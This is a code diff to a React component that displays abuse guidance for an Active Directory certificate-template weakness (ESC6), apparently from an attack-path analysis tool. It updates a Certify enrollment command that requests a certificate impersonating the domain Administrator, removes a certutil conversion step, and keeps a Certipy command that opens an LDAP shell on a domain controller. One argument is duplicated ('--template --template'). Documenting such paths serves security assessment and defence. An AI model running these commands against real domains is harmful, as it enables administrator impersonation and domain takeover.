@@ -25,13 +25,16 @@ const WindowsAbuse: FC = () => {
                 <Box component='span' sx={{ fontWeight: 'bold' }}>
                     Step 1:
                 </Box>{' '}
-                Use Certify to request enrollment int he affected template, specifying the affected certification
+                Use Certify (2.0) to request enrollment in the affected template, specifying the affected certification
                 authority and target principal to impersonate:
             </Typography>
             <Typography component={'pre'}>
                 {
-                    '.\\Certify.exe request /ca:rootdomaindc.forestroot.com\\forestroot-RootDomainDC-CA /template:ESC6 /altname:forestrootda'
+                    'Certify.exe request --ca rootdomaindc.forestroot.com\\forestroot-RootDomainDC-CA --template --template User --upn Administrator --sid-url S-1-5-21-976219687-1556195986-4104514715-500'
                 }
+            </Typography>
+            <Typography variant='body2'>
+                The certificate PFX is printed to the console in a base64-encoded format.
             </Typography>
             <Typography variant='body2'>
                 If the enrollment fails with an error message stating that the Email or DNS name is unavailable and
@@ -46,15 +49,8 @@ const WindowsAbuse: FC = () => {
                 <Box component='span' sx={{ fontWeight: 'bold' }}>
                     Step 2:
                 </Box>{' '}
-                Convert the emitted certificate to PFX format:
-            </Typography>
-            <Typography component={'pre'}>{'certutil.exe -MergePFX .\\cert.pem .\\cert.pfx'}</Typography>
-            <Typography variant='body2'>
-                <Box component='span' sx={{ fontWeight: 'bold' }}>
-                    Step 3:
-                </Box>{' '}
                 Use Certipy to connect to the domain controller via Schannel, specifying the PFX-formatted certificate
-                created in Step 2:
+                created in Step 1:
             </Typography>
             <Typography component={'pre'}>{'certipy auth -pfx .\\cert.pfx -dc-ip 10.4.0.4 -ldap-shell'}</Typography>
         </>
